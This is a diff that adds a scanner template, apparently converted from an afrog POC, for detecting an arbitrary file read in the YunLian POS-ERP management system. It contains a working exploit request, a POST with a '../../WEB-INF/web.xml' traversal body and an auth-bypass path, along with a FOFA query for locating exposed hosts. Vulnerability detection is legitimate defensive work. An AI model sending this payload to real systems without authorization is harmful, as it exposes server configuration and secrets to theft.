@@ -1,0 +1,31 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - body: downloadFile=../../WEB-INF/web.xml
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - <web-app
+          - </web-app>
+        condition: and
+    method: POST
+    path:
+      - '{{BaseURL}}/admin/file!download.action;admin!login.action'
+id: yunlian-pos-erp-downloadfile-fileread
+info:
+  author: ZacharyZcR
+  description: |
+    YunLian POS-ERP Management System downloadFile interface has an arbitrary file read vulnerability.
+    An attacker can read arbitrary files by sending a specially crafted POST request.
+    FOFA: title="Powered By chaosZ"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: YunLian POS-ERP DownloadFile Arbitrary File Read
+  severity: high
+  tags: yunlian,lfi,fileread,argus-import
